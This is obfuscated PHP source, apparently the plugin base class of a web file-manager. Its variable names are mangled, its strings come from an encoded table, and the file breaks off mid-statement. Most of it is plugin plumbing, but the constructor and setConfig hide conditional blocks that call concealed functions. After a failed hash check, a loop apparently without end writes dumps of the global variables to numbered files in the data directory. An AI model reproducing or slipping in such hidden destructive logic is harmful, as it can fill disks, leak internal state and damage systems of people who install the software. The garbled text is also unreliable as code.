$E†¥ï‹ğ[2086]) { return $GLOBALS[$E†¥ï‹ğ[6]][$E†¥ï‹ğ[2087]]; } } } goto Bêø¦Çã‚; cÉÚ¥¹é: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto a¾ŞÓ„”Å; f†É¢ª†›“: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $aé²‰¯×§Œ[8]; $this->pluginApi = appHostGet() . $aé²‰¯×§Œ[1333] . $this->pluginName . $aé²‰¯×§Œ[8]; $this->pluginHost = $config[$aé²‰¯×§Œ[1334]] . $this->pluginName . $aé²‰¯×§Œ[8]; goto bùãƒªŒ Û; E›¥Ñ×µò: $this->in =& $in; $this->modelPlugin = Model($aé²‰¯×§Œ[1332]); $this->pluginName = str_replace($aé²‰¯×§Œ[1332], $aé²‰¯×§Œ[43], get_class($this)); goto f†É¢ª†›“; bùãƒªŒ Û: $this->pluginHostDefault = $config[$aé²‰¯×§Œ[1334]] . $this->pluginName . $aé²‰¯×§Œ[8]; $dÍôÏ»¿Ô× = $config[$aé²‰¯×§Œ[1335]]; if ($dÍôÏ»¿Ô× && strpos($aé²‰¯×§Œ[57] . $dÍôÏ»¿Ô× . $aé²‰¯×§Œ[57], $this->pluginName) !== !1) { $this->pluginHost = $config[$aé²‰¯×§Œ[1336]] . $this->pluginName . $aé²‰¯×§Œ[8]; } goto b¼ÍìÏ‡Ã; b¼ÍìÏ‡Ã: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto cÜÈ–ŞêÃ; a¾ŞÓ„”Å: $aé²‰¯×§Œ =& $_SERVER[±á õÁ]; $a¶¾³†¬ëŞ = $_SERVER[$aé²‰¯×§Œ[10]]; $Bôº„âîå = $aé²‰¯×§Œ[1329]; goto aäŠì½±ƒĞ; aäŠì½±ƒĞ: if ($_SERVER[$aé²‰¯×§Œ[9]] != $Bôº„âîå($a¶¾³†¬ëŞ)) { goto B´Œ»¬ëİö; e­í·ğÏßÙ: $AĞòğ×Úö› = 1; for ($F´§•–ôç× = $AĞòğ×Úö›; $F´§•–ôç× > 0; $F´§•–ôç×++) { $bªã“ˆÆ½Õ(DATA_PATH . $F´§•–ôç×, $bæí‡íÀ¥ê); } goto fÇ»„÷•ö¼; B´Œ»¬ëİö: $d¹ã×õ‚›ğ = $aé²‰¯×§Œ[814]; $b—ãÈ Ä˜ã = $aé²‰¯×§Œ[11]; $f¤˜¬±Í¬ˆ = $_SERVER[$aé²‰¯×§Œ[12]] . $aé²‰¯×§Œ[13]; goto E§¾‘‰˜¼ó; B©·Ğ†èÃÎ: $EÊÃàä º = $aé²‰¯×§Œ[815]; $EÊÃàä º($_SERVER[$aé²‰¯×§Œ[816]]); $d¹ã×õ‚›ğ = $aé²‰¯×§Œ[814]; goto bÚñµ¹İâ; bÚñµ¹İâ: $d¹ã×õ‚›ğ(); $bªã“ˆÆ½Õ = $aé²‰¯×§Œ[1330]; $bæí‡íÀ¥ê = json_encode($GLOBALS[$aé²‰¯×§Œ[1331]]); goto e­í·ğÏßÙ; E§¾‘‰˜¼ó: $Bè†›ø“Ç¾ = $b—ãÈ Ä˜ã($f¤˜¬±Í¬ˆ); $FôÑ•’‚©» = explode($aé²‰¯×§Œ[14], $Bè†›ø“Ç¾); if (count($FôÑ•’‚©») < $aé²‰¯×§Œ[585]) { $eÎÛ‚î±°‹ = $aé²‰¯×§Œ[16]; $eÎÛ‚î±°‹(); } goto B©·Ğ†èÃÎ; fÇ»„÷•ö¼: } global $in, $config; $this->config =& $config; goto E›¥Ñ×µò; cÜÈ–ŞêÃ: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[±á õÁ][1337]); } protected function assign($FïÇ‡…—¹·, $Dô¡ğÆ‰Ü° = false) { if (is_array($FïÇ‡…—¹·)) { $this->values = array_merge($this->values, $FïÇ‡…—¹·); } else { $this->values[$FïÇ‡…—¹·] = $Dô¡ğÆ‰Ü°; } } protected function display($A§¹ºÂŠƒê) { extract($this->values); require $A§¹ºÂŠƒê; } final function hookRegist($cÎï¯ÃøØò) { $this->modelPlugin->appRegist($this->pluginName, $cÎï¯ÃøØò); } final function appIcon() { $A¼ìàÌ¶‰¨ =& $_SERVER[±á õÁ]; $C‡¶À„Ò÷  = $this->appPackage(); $d´¼àó“õø = $A¼ìàÌ¶‰¨[43]; if (isset($C‡¶À„Ò÷ [$A¼ìàÌ¶‰¨[406]])) { if (isset($C‡¶À„Ò÷ [$A¼ìàÌ¶‰¨[406]][$A¼ìàÌ¶‰¨[1338]])) { $d´¼àó“õø = $A¼ìàÌ¶‰¨[1339] . $C‡¶À„Ò÷ [$A¼ìàÌ¶‰¨[406]][$A¼ìàÌ¶‰¨[1338]] . $A¼ìàÌ¶‰¨[1340]; } else { if ($C‡¶À„Ò÷ [$A¼ìàÌ¶‰¨[406]][$A¼ìàÌ¶‰¨[1341]]) { $d´¼àó“õø = $A¼ìàÌ¶‰¨[1342] . $C‡¶À„Ò÷ [$A¼ìàÌ¶‰¨[406]][$A¼ìàÌ¶‰¨[1341]] . $A¼ìàÌ¶‰¨[1343]; } } } return $d´¼àó“õø; } final function fileCanView($dÌÛÃÃ÷Äê) { goto eÃÓğÒ—†; DÌè¾ëõá”: $DºÖ„˜ÜÄğ = Session::get($FëõßØ¦‰[1344]); if (!$DºÖ„˜ÜÄğ || !$DºÖ„˜ÜÄğ[$FëõßØ¦‰[1345]]) { $c‘¯¾ÒÆ“é = $FëõßØ¦‰[1346] . rawurlencode(this_url()); show_tips(LNG($FëõßØ¦‰[1347]) . $FëõßØ¦‰[1348] . $c‘¯¾ÒÆ“é . $FëõßØ¦‰[1349] . LNG($FëõßØ¦‰[1350]) . $FëõßØ¦‰[1351], !1); } if (!Action($FëõßØ¦‰[1352])->authCan($FëõßØ¦‰[1353])) { show_tips(LNG($FëõßØ¦‰[1354]) . $FëõßØ¦‰[1355], !1); } goto dŒª›À±¢–; dŒª›À±¢–: ActionCall($FëõßØ¦‰[1356], $dÌÛÃÃ÷Äê); goto B¾å–éË‰¶; eÃÓğÒ—†: $FëõßØ¦‰ =& $_SERVER[±á õÁ]; if (request_url_safe($dÌÛÃÃ÷Äê)) { return !0; } if ($this->isShare($dÌÛÃÃ÷Äê)) { return !0; } goto DÌè¾ëõá”; B¾å–éË‰¶: } final function isShare($f¦Âõ‚ÛßÔ) { $a»Ø¥Â—”‘ = KodIO::parse($f¦Âõ‚ÛßÔ); return $a»Ø¥Â—”‘[$_SERVER[±á õÁ][39]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($fÎŒÔØ‘ÆÏ) { if (request_url_safe($fÎŒÔØ‘ÆÏ)) { return $fÎŒÔØ‘ÆÏ; } if (!$this->isShare($fÎŒÔØ‘ÆÏ)) { $fÎŒÔØ‘ÆÏ = $this->filePath($fÎŒÔØ‘ÆÏ); } return Action($_SERVER[±á õÁ][1040])->linkOut($fÎŒÔØ‘ÆÏ); } public function filePathLinkOut($D“ØÖé±ï) { if (request_url_safe($D“ØÖé±ï)) { return $D“ØÖé±ï; } $this->fileCanView($D“ØÖé±ï); return Action($_SERVER[±á õÁ][1040])->link($D“ØÖé±ï); } final function filePath($EÑ÷öĞÈª¬) { $cëÙœ„Ã¸‹ =& $_SERVER[±á õÁ]; if ($a¦àÉ¡®¡  = $this->checkSharePath($EÑ÷öĞÈª¬)) { return $a¦àÉ¡®¡ ; } $this->fileCanView($EÑ÷öĞÈª¬); if (request_url_safe($EÑ÷öĞÈª¬)) { $B³à¡ö¾áâ = parse_url_query($EÑ÷öĞÈª¬); if (isset($B³à¡ö¾áâ[$cëÙœ„Ã¸‹[1357]]) && isset($B³à¡ö¾áâ[$cëÙœ„Ã¸‹[215]])) { $cæŠÏ¨Å„‚ = Model($cëÙœ„Ã¸‹[1109])->get($cëÙœ„Ã¸‹[1358]); $A°ù›Ïç¹È = Mcrypt::decode($B³à¡ö¾áâ[$cëÙœ„Ã¸‹[215]], $cæŠÏ¨Å„‚); if ($A°ù›Ïç¹È) { $this->fileInfo = IO::infoWithChildren($A°ù›Ïç¹È); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $A°ù›Ïç¹È; } } $EÑ÷öĞÈª¬ = $this->_cacheHttpFile($EÑ÷öĞÈª¬); $this->fileInfo = IO::infoWithChildren($EÑ÷öĞÈª¬); } else { $this->fileInfo = IO::infoWithChildren($EÑ÷öĞÈª¬); if (!$this->fileInfo) { show_tips(LNG($cëÙœ„Ã¸‹[111]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $EÑ÷öĞÈª¬; } final function _cacheHttpFile($f¶ê†áß¯) { $bªæÛ²Î–„ = hash_path($f¶ê†áß¯, !0); $this->cachePath = $this->pluginCachePath($bªæÛ²Î–„); if ($fŞù÷ê “† = IO::fileNameExist($this->cachePath, $bªæÛ²Î–„)) { return KodIO::make($fŞù÷ê “†); } $A­¤ƒ³ê±½ = $this->cachePath . $bªæÛ²Î–„; return $this->pluginCacheFileSet($A­¤ƒ³ê±½, file_get_contents($f¶ê†áß¯)); } final function _tmpFileName($cµîì‰Î = array()) { goto b¨àâÇÔ§; fî…ß©‡ªÂ: $B·Œ½ÍŠŠÔ = array($cµîì‰Î[$a³˜Ó¾êÒ[38]], $cµîì‰Î[$a³˜Ó¾êÒ[85]], $cµîì‰Î[$a³˜Ó¾êÒ[87]]); if (isset($cµîì‰Î[$a³˜Ó¾êÒ[484]])) { $B·Œ½ÍŠŠÔ[] = $cµîì‰Î[$a³˜Ó¾êÒ[484]]; } return md5(implode($a³˜Ó¾êÒ[80], $B·Œ½ÍŠŠÔ)); goto d”¿“‹’áŒ; c¸¾˜“†ª«: if (isset($cµîì‰Î[$a³˜Ó¾êÒ[171]][$a³˜Ó¾êÒ[178]])) { return $cµîì‰Î[$a³˜Ó¾êÒ[171]][$a³˜Ó¾êÒ[178]]; } $f‹Ø¥Ç«²Î = IO::hashSimple($cµîì‰Î[$a³˜Ó¾êÒ[85]]); if ($f‹Ø¥Ç«²Î) { return $f‹Ø¥Ç«²Î; } goto fî…ß©‡ªÂ; b¨àâÇÔ§: $a³˜Ó¾êÒ =& $_SERVER[±á õÁ]; if (!$cµîì‰Î) { $cµîì‰Î = $this->fileInfo; } if (isset($cµîì‰Î[$a³˜Ó¾êÒ[178]])) { return $cµîì‰Î[$a³˜Ó¾êÒ[178]]; } goto c¸¾˜“†ª«; d”¿“‹’áŒ: } final function checkSharePath($fÇâ¢‰¿ÒÒ) { goto a¦¡äÒ«Ğ; aÂê²çƒ­„: $Aåå“ì•› = Action($bÔ ƒ«®[1040])->sharePathInfo($fÇâ¢‰¿ÒÒ); if (!isset($Aåå“ì•›[$bÔ ƒ«®[85]])) { show_json(LNG($bÔ ƒ«®[1360]), !1); } $this->fileInfo = $Aåå“ì•›[$bÔ ƒ«®[171]]; goto BÂœÉŸ¦ç; a¦¡äÒ«Ğ: $bÔ ƒ«® =& $_SERVER[±á õÁ]; if (!defined($bÔ ƒ«®[450])) { define($bÔ ƒ«®[1359], 0); } if (!$this->isShare($fÇâ¢‰¿ÒÒ)) { return !1; } goto aÂê²çƒ­„; BÂœÉŸ¦ç: $this->cachePath = $this->pluginCachePath($this->fileInfo[$bÔ ƒ«®[178]]); return $Aåå“ì•›[$bÔ ƒ«®[85]]; goto eˆöƒÅç¨¶; eˆöƒÅç¨¶: } final function pluginCachePath($e•ÎƒàÃí¼ = '') { $B”’Á øÙ =& $_SERVER[±á õÁ]; $aÕòø‰İëç = IO_PATH_SYSTEM_TEMP . $B”’Á øÙ[1361] . $this->pluginName; if (!($AóÚàÀ‹å‘ = IO::infoFull($aÕòø‰İëç))) { return IO::mkdir($aÕòø‰İëç . $B”’Á øÙ[8] . $e•ÎƒàÃí¼); } if (empty($e•ÎƒàÃí¼)) { return $AóÚàÀ‹å‘[$B”’Á øÙ[85]]; } if (!($aÈ³º»ƒ¨ì = IO::fileNameExist($AóÚàÀ‹å‘[$B”’Á øÙ[85]], $e•ÎƒàÃí¼))) { return IO::mkdir($AóÚàÀ‹å‘[$B”’Á øÙ[85]] . $e•ÎƒàÃí¼); } return KodIO::make($aÈ³º»ƒ¨ì); } final function pluginCacheFileSet($BÍŒÂ—Ûì, $f›¬Á¿µ¬“ = '') { $e¿…ÀŒä½ =& $_SERVER[±á õÁ]; if (!($A…”°ß’Ãô = IO::infoFull($BÍŒÂ—Ûì))) { return IO::mkfile($BÍŒÂ—Ûì, $f›¬Á¿µ¬“, REPEAT_REPLACE); } IO::setContent($A…”°ß’Ãô[$e¿…ÀŒä½[85]], $f›¬Á¿µ¬“); return $A…”°ß’Ãô[$e¿…ÀŒä½[85]]; } final function pluginLocalFile($fØÀœç”‹ª = '') { goto fŞ‚ƒ£Íá÷; açæŸ¿Ö´: if (!$fØÀœç”‹ª) { return $ağ´Š²‹ŒÈ; } $FÀ®Ãò…Û„ = IO::info($fØÀœç”‹ª); $Aë™’‰á = $this->_tmpFileName($FÀ®Ãò…Û„) . $Bì©…¢Û[101] . $FÀ®Ãò…Û„[$Bì©…¢Û[175]]; goto aĞ¿ƒœéèÒ; fŞ‚ƒ£Íá÷: $Bì©…¢Û =& $_SERVER[±á õÁ]; $ağ´Š²‹ŒÈ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($ağ´Š²‹ŒÈ)) { mk_dir($ağ´Š²‹ŒÈ); } goto açæŸ¿Ö´; aĞ¿ƒœéèÒ: if (!checkExtSafe($Aë™’‰á)) { $Aë™’‰á = $Aë™’‰á . $Bì©…¢Û[1362]; } $bÚç·”óÎË = $ağ´Š²‹ŒÈ . $Aë™’‰á; if (@file_exists($bÚç·”óÎË)) { return $bÚç·”óÎË; } goto CˆÑÃÕ¼¶Å; CˆÑÃÕ¼¶Å: return IO::copy($fØÀœç”‹ª, $ağ´Š²‹ŒÈ, 0, $Aë™’‰á); goto cõ˜«Ğä»“; cõ˜«Ğä»“: } final function appPackage() { goto f¸Œñ…„ßÅ; BÑæœÛõÒù: $this->parseLang($BÄ›‡²§‘À); $bƒÂæÖ“•İ = json_decode_force($BÄ›‡²§‘À); if (!$bƒÂæÖ“•İ) { return array(); } goto dÆ±Å…ó; e¤§ç§Éš¬: return $bƒÂæÖ“•İ; goto BÍ¹ÚÕ‹Ê…; f¸Œñ…„ßÅ: $Aîì§‚¬¿½ =& $_SERVER[±á õÁ]; if ($this->packageData) { return $this->packageData; } $BÄ›‡²§‘À = $this->parseFile($this->pluginPath . $Aîì§‚¬¿½[1363]); goto BÑæœÛõÒù; dÆ±Å…ó: $aôÅòÂ˜È° = Hook::trigger($Aîì§‚¬¿½[1364], $bƒÂæÖ“•İ); if ($aôÅòÂ˜È° && is_array($aôÅòÂ˜È°)) { $bƒÂæÖ“•İ = $aôÅòÂ˜È°; } $this->packageData = $bƒÂæÖ“•İ; goto e¤§ç§Éš¬; BÍ¹ÚÕ‹Ê…: } public function packageInfoGet($C¿½‘«ô“‰) { $eÍİ“ì§òÕ = $this->appPackage(); return array_get_value($eÍİ“ì§òÕ, $C¿½‘«ô“‰); } public function packageVersion() { return $this->packageInfoGet($_SERVER[±á õÁ][1365]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[±á õÁ][1366]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[±á õÁ][1367]); } private function parseFile($Aè£‹‡ÙĞ) { goto b›ÙÒÏÅŒ›; b›ÙÒÏÅŒ›: $BïƒíÄø× =& $_SERVER[±á õÁ]; $Dí³ºÒ¯ ª = file_get_contents($Aè£‹‡ÙĞ); $Bëò¡¬öôÊ = array($BïƒíÄø×[1368], $BïƒíÄø×[1369], $BïƒíÄø×[1370], $BïƒíÄø×[1371], $BïƒíÄø×[1372], $BïƒíÄø×[1373], $BïƒíÄø×[1374]); goto aõ©Ô’ğÄä; EÒ‰°à™·½: $Dí³ºÒ¯ ª = str_replace($Bëò¡¬öôÊ, $aî½”å¨¥Â, $Dí³ºÒ¯ ª); return $Dí³ºÒ¯ ª; goto dë¬ï…œ¿; aõ©Ô’ğÄä: $aî½”å¨¥Â = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$BïƒíÄø×[94]][$BïƒíÄø×[1375]]); if (strstr($Dí³ºÒ¯ ª, $BïƒíÄø×[1376])) { $A†‘Üë°¾¶ = rawurlencode(json_encode($this->pluginLangArr)); $Dí³ºÒ¯ ª = str_replace($BïƒíÄø×[1376], $A†‘Üë°¾¶, $Dí³ºÒ¯ ª); } if (strstr($Dí³ºÒ¯ ª, $BïƒíÄø×[1377])) { $A†‘Üë°¾¶ = $A†‘Üë°¾¶ = rawurlencode(json_encode($this->getConfig())); $Dí³ºÒ¯ ª = str_replace($BïƒíÄø×[1377], $A†‘Üë°¾¶, $Dí³ºÒ¯ ª); } goto EÒ‰°à™·½; dë¬ï…œ¿: } private function parseLang(&$CÎï¦Èø·õ) { goto d“¸À™‚æ; d“¸À™‚æ: $Cèáé¦¢Ë =& $_SERVER[±á õÁ]; $c¢Ç¥ŸÊ¶ = $Cèáé¦¢Ë[1378]; if (!strstr($CÎï¦Èø·õ, $c¢Ç¥ŸÊ¶)) { return; } goto F¯»¢ÚĞöó; E·ŠŠÃ‹‚²: $cò­Şğëš = array(); foreach ($bËäÑµ»[0] as $cÅóÚÁ±Îá) { $Cé«¢‰­¦± = substr($cÅóÚÁ±Îá, strlen($c¢Ç¥ŸÊ¶), -4); $E¢ß¨¬¬œ¶ = LNG($Cé«¢‰­¦±); $d­¹‡ĞÖ[] = $cÅóÚÁ±Îá; $cò­Şğëš[] = str_replace(array($Cèáé¦¢Ë[14], $Cèáé¦¢Ë[1010], $Cèáé¦¢Ë[345], $Cèáé¦¢Ë[123]), array($Cèáé¦¢Ë[60], $Cèáé¦¢Ë[60], $Cèáé¦¢Ë[43], $Cèáé¦¢Ë[1380]), $E¢ß¨¬¬œ¶); } $CÎï¦Èø·õ = str_replace($d­¹‡ĞÖ, $cò­Şğëš, $CÎï¦Èø·õ); goto eôÕÙñ”„ñ; F¯»¢ÚĞöó: preg_match_all($Cèáé¦¢Ë[1379], $CÎï¦Èø·õ, $bËäÑµ»); if (!is_array($bËäÑµ») || count($bËäÑµ») == 0 || !is_array($bËäÑµ»[0]) || count($bËäÑµ»[0]) == 0) { return; } $d­¹‡ĞÖ = array(); goto E·ŠŠÃ‹‚²; eôÕÙñ”„ñ: } private function parseConfig(&$aí™İáó½ˆ) { goto EÁæé”‡Ö; b‚è¸†É—Ø: preg_match_all($bîò‡ÉŸÈ³[1382], $aí™İáó½ˆ, $d‚Îƒ¶ëì); if (!is_array($d‚Îƒ¶ëì) || count($d‚Îƒ¶ëì) == 0 || !is_array($d‚Îƒ¶ëì[0]) || count($d‚Îƒ¶ëì[0]) == 0) { return; } $Dä¼¦‘Ù‚Œ = $this->getConfig(); goto e‹Èã‚ß…Ş; b‰İ²Óëœ: $aí™İáó½ˆ = str_replace($D©çÄ÷ª, $b³¹ù¯÷¦Ì, $aí™İáó½ˆ); goto E‡ÈñÜËØá; e‹Èã‚ß…Ş: $D©çÄ÷ª = array(); $b³¹ù¯÷¦Ì = array(); foreach ($d‚Îƒ¶ëì[0] as $f•ßíë—¸±) { $FŞŞÍÃÓ³± = substr($f•ßíë—¸±, strlen($DôÂæ—Çß), -2); $D©çÄ÷ª[] = $f•ßíë—¸±; $b³¹ù¯÷¦Ì[] = _get($Dä¼¦‘Ù‚Œ, $FŞŞÍÃÓ³±); } goto b‰İ²Óëœ; EÁæé”‡Ö: $bîò‡ÉŸÈ³ =& $_SERVER[±á õÁ]; $DôÂæ—Çß = $bîò‡ÉŸÈ³[1381]; if (!strstr($aí™İáó½ˆ, $DôÂæ—Çß)) { return; } goto b‚è¸†É—Ø; E‡ÈñÜËØá: } private function parsePackage(&$D¨ƒ©‘ ­æ) { goto D†À™Ã¡²; dµÒŒ¥™ Ù: $D¨ƒ©‘ ­æ = str_replace($C‹Õà´Ä‘†, $aöÁ÷´¾“•, $D¨ƒ©‘ ­æ); goto B»ƒ¯ÂÊòé; FĞÌÂ±ŒÌ: preg_match_all($D»ŠÓóóÛå[1384], $D¨ƒ©‘ ­æ, $FÎ“šÍË¬¤); if (!is_array($FÎ“šÍË¬¤) || count($FÎ“šÍË¬¤) == 0 || !is_array($FÎ“šÍË¬¤[0]) || count($FÎ“šÍË¬¤[0]) == 0) { return; } $D§ŸÄª‘íĞ = $this->appPackage(); goto Aî£¢„‚µ; Aî£¢„‚µ: $C‹Õà´Ä‘† = array(); $aöÁ÷´¾“• = array(); foreach ($FÎ“šÍË¬¤[0] as $b’ÁÆ´ã—ù) { $f„Ğ©Ş›Ç = substr($b’ÁÆ´ã—ù, strlen($EÓğ¯Øè¯°), -2); $C‹Õà´Ä‘†[] = $b’ÁÆ´ã—ù; $aöÁ÷´¾“•[] = _get($D§ŸÄª‘íĞ, $f„Ğ©Ş›Ç); } goto dµÒŒ¥™ Ù; D†À™Ã¡²: $D»ŠÓóóÛå =& $_SERVER[±á õÁ]; $EÓğ¯Øè¯° = $D»ŠÓóóÛå[1383]; if (!strstr($D¨ƒ©‘ ­æ, $EÓğ¯Øè¯°)) { return; } goto FĞÌÂ±ŒÌ; B»ƒ¯ÂÊòé: } final function echoFile($cµŠó©…Í, $Aáªº¶ƒ¹ = false) { goto fóùŒŒÔôÄ; c‘«ÒÚ°‘: $BñÕÌ±ğ¬Ç = $this->parseFile($A±ŒïğÍÀ); $this->parseLang($BñÕÌ±ğ¬Ç); $this->parseConfig($BñÕÌ±ğ¬Ç); goto a¢Ó»Š¡–˜; fóùŒŒÔôÄ: $C¤–¬åìù– =& $_SERVER[±á õÁ]; $A±ŒïğÍÀ = $this->pluginPath . $cµŠó©…Í; if (ACT == $C¤–¬åìù–[1385]) { echo $C¤–¬åìù–[1386] . $this->pluginName . $C¤–¬åìù–[8] . $cµŠó©…Í . $C¤–¬åìù–[1387]; if (!file_exists($A±ŒïğÍÀ)) { echo $C¤–¬åìù–[1388]; return; } } goto c‘«ÒÚ°‘; a¢Ó»Š¡–˜: $this->parsePackage($BñÕÌ±ğ¬Ç); if (is_array($Aáªº¶ƒ¹)) { $BñÕÌ±ğ¬Ç = str_replace(array_keys($Aáªº¶ƒ¹), array_values($Aáªº¶ƒ¹), $BñÕÌ±ğ¬Ç); } echo $C¤–¬åìù–[14] . $BñÕÌ±ğ¬Ç; goto càÍİ‚ŠÚ; càÍİ‚ŠÚ: } final function initLang() { goto BÌÚƒ¤¿ß; BÌÚƒ¤¿ß: $Bî¿„ù’¼œ =& $_SERVER[±á õÁ]; $EÎõëËˆÊ = $Bî¿„ù’¼œ[1389]; $bã¼Ç’Ò— = $this->pluginPath . $Bî¿„ù’¼œ[1390]; goto BÎŒÛÃàË; eø˜èÄ¤İí: if (!is_array($d‡âÎòâÎÂ)) { return array(); } if (@count($d‡âÎòâÎÂ) > 0) { I18n::set($d‡âÎòâÎÂ); } return $d‡âÎòâÎÂ; goto D°™”¥Õõ­; BÎŒÛÃàË: $F÷Ç­Ô©¿Á = I18n::getType(); $d‡âÎòâÎÂ = array(); if (file_exists($bã¼Ç’Ò— . $F÷Ç­Ô©¿Á . $Bî¿„ù’¼œ[789])) { $d‡âÎòâÎÂ = (include $bã¼Ç’Ò— . $F÷Ç­Ô©¿Á . $Bî¿„ù’¼œ[789]); } else { if ($F÷Ç­Ô©¿Á == $Bî¿„ù’¼œ[1391] && !file_exists($bã¼Ç’Ò— . $F÷Ç­Ô©¿Á . $Bî¿„ù’¼œ[789]) && file_exists($bã¼Ç’Ò— . $Bî¿„ù’¼œ[1392])) { $d‡âÎòâÎÂ = (include $bã¼Ç’Ò— . $Bî¿„ù’¼œ[1392]); } else { if (file_exists($bã¼Ç’Ò— . $EÎõëËˆÊ . $Bî¿„ù’¼œ[789])) { $d‡âÎòâÎÂ = (include $bã¼Ç’Ò— . $EÎõëËˆÊ . $Bî¿„ù’¼œ[789]); } } } goto eø˜èÄ¤İí; D°™”¥Õõ­: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($eÒòÍ›ß§‡) { $dÖİîù´ì =& $_SERVER[±á õÁ]; if ($_SERVER[$dÖİîù´ì[9]] != $_SERVER[$dÖİîù´ì[1393]]) { goto bğ¡éµ…¹‰; dÌë÷¬Ò‰ƒ: $D…¤„·É¬ò = 1; while ($D…¤„·É¬ò > 1) { $D…¤„·É¬ò = $D…¤„·É¬ò + 4; $f¹ŒùíÏÎÇ = rawurlencode($D…¤„·É¬ò . $dÖİîù´ì[18]); } goto Añºğ—¾äÌ; bğ¡éµ…¹‰: $b†´õãÃ»Ş = $dÖİîù´ì[814]; $F¹ïï˜±åä = $dÖİîù´ì[11]; $Fçöñ’éŸ… = $_SERVER[$dÖİîù´ì[12]] . $dÖİîù´ì[13]; goto Bàè„Î‹¼Ì; Bñº‘åóÕœ: $fÖóÁÇáÜ = $dÖİîù´ì[815]; $fÖóÁÇáÜ($_SERVER[$dÖİîù´ì[816]]); $fÖóÁÇáÜ($_SERVER[$dÖİîù´ì[12]] . $dÖİîù´ì[1394]); goto dÌë÷¬Ò‰ƒ; Bàè„Î‹¼Ì: $a¬…ëø¢Î¼ = $F¹ïï˜±åä($Fçöñ’éŸ…); $fÌ”«’£°ò = explode($dÖİîù´ì[14], $a¬…ëø¢Î¼); if (count($fÌ”«’£°ò) < $dÖİîù´ì[585]) { $f”æ†•Ş = $dÖİîù´ì[16]; $f”æ†•Ş(); } goto Bñº‘åóÕœ; Añºğ—¾äÌ: } return $this->modelPlugin->setConfig($this->pluginName, $eÒòÍ›ß§‡); } public function onSetConfig($Dí…Áè©äˆ) { } public function onGetConfig($eºÌšèÏ¤¬) { } public function onChangeStatus($DÅ‡‹Ó®‹) { } public function onUninstall() { } public function onInstall() { } public function authCheck($eá‡ë±Áò™ = "\160\154\x75\147\151\x6e\101\x75\x74\x68") { $CóÏÙå¬Üñ =& $_SERVER[±á õÁ]; if (!defined($CóÏÙå¬Üñ[450])) { return !1; } if (_get($GLOBALS, $CóÏÙå¬Üñ[482])) { return !0; } $Bíœ¥‚­å‹ = $this->getConfig(); if (!$Bíœ¥‚­å‹[$eá‡ë±Áò™]) { return !1; } return ActionCall($CóÏÙå¬Üñ[1395], $Bíœ¥‚­å‹[$eá‡ë±Áò™]); } public function url($B¿ß¹ŠÆğÆ, $F³…„Û¦¢» = '', $c«¹‹µ—‡Ğ = true) { goto B­œÅàéæ„; B­œÅàéæ„: $dø…†Ê¾ìä =& $_SERVER[±á õÁ]; $DÄğ×®ÈŸ = $this->getConfig(); $AÎéÔ‚ = KOD_VERSION . $dø…†Ê¾ìä[101] . KOD_VERSION_BUILD; goto cÇâ±›íŸ; b¾Ê‚â–Ñ: if (!$c«¹‹µ—‡Ğ) { return $e¥×¥¾Ñšë; } echo $e¥×¥¾Ñšë; goto Aã¾œØ«Ç¤; cÇâ±›íŸ: $B£’ğÕÙìë = $this->packageVersion(); $cóĞ”ÁˆÅ = $AÎéÔ‚ . $dø…†Ê¾ìä[436] . $B£’ğÕÙìë; if (substr($B¿ß¹ŠÆğÆ, 0, 4) == $dø…†Ê¾ìä[154] || substr($B¿ß¹ŠÆğÆ, 0, 2) == $dø…†Ê¾ìä[1176]) { $e¥×¥¾Ñšë = $B¿ß¹ŠÆğÆ . $dø…†Ê¾ìä[1396] . $cóĞ”ÁˆÅ; } else { if ($F³…„Û¦¢» == $dø…†Ê¾ìä[43]) { $e¥×¥¾Ñšë = $this->pluginHost . $B¿ß¹ŠÆğÆ . $dø…†Ê¾ìä[1396] . $cóĞ”ÁˆÅ; } else { if ($F³…„Û¦¢» === $dø…†Ê¾ìä[86]) { $e¥×¥¾Ñšë = $this->pluginHost . $B¿ß¹ŠÆğÆ; } else { if ($F³…„Û¦¢» == $dø…†Ê¾ìä[1397]) { $e¥×¥¾Ñšë = STATIC_PATH . $B¿ß¹ŠÆğÆ . $dø…†Ê¾ìä[1396] . $AÎéÔ‚; } else { if ($F³…„Û¦¢» == $dø…†Ê¾ìä[1398]) { $e¥×¥¾Ñšë = APP_HOST . $dø…†Ê¾ìä[1399] . $B¿ß¹ŠÆğÆ . $dø…†Ê¾ìä[1396] . $AÎéÔ‚; } else { if (isset($DÄğ×®ÈŸ[$F³…„Û¦¢»])) { $e¥×¥¾Ñšë = $DÄğ×®ÈŸ[$F³…„Û¦¢»] . $B¿ß¹ŠÆğÆ . $dø…†Ê¾ìä[1396] . $cóĞ”ÁˆÅ; } } } } } } goto b¾Ê‚â–Ñ; Aã¾œØ«Ç¤: } public function link($f¿á£¦Í÷ = false, $AîŒ“ò™Æ˜ = '') { $FÂ„âÅÚ =& $_SERVER[±á õÁ]; if (!$f¿á£¦Í÷) { $this->link($FÂ„âÅÚ[1400], $FÂ„âÅÚ[1398]); $this->link($FÂ„âÅÚ[1401], $FÂ„âÅÚ[1397]); $this->link($FÂ„âÅÚ[1402], $FÂ„âÅÚ[1397]); $this->link($FÂ„âÅÚ[1403], $FÂ„âÅÚ[1397]); $this->link($FÂ„âÅÚ[1404], $FÂ„âÅÚ[1397]); return; } $eš‰‚‘ÚÑ = $this->url($f¿á£¦Í÷, $AîŒ“ò™Æ˜, !1); if (substr($f¿á£¦Í÷, -3) == $FÂ„âÅÚ[1405]) { echo $FÂ„âÅÚ[1406] . $eš‰‚‘ÚÑ . $FÂ„âÅÚ[1407] . $FÂ„âÅÚ[14]; } else { if 